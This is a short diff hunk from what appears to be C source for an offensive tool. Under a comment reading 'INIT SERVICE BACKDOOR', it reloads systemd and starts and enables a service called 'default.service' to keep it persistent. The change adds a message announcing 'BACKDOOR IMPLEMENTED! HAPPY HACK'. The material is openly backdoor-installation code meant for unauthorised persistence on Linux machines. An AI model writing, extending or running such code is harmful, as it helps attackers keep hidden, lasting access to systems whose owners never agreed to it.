@@ -129,7 +129,7 @@ case 2:
 	// INIT SERVICE BACKDOOR
 	system("/usr/bin/systemctl daemon-reload");
 	system("/usr/bin/systemctl start default.service && /usr/bin/systemctl enable default.service");
-
+	printf("[+] BACKDOOR IMPLEMENTED! HAPPY HACK");
 
 	break;
 case 3:
